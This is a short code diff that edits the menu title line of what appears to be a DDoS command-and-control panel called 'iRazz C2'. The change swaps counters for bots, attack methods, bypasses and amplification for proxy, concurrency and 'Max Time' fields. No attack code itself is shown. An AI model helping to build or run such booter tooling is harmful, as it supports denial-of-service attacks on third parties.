@@ -217,7 +217,7 @@ def amp_games():
 
 
 def menu():
-    sys.stdout.write(f"         \x1b]2;iRazz C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
+    sys.stdout.write(f"         \x1b]2;iRazz C2 --> Proxy Active [ {bots} ] | Conc Active: [ 1 ] | VVIP: [ true ] | Max Time: [ 99999 ] | Login As: [ iRazz ]")
     clear()
     print("")
     print("")
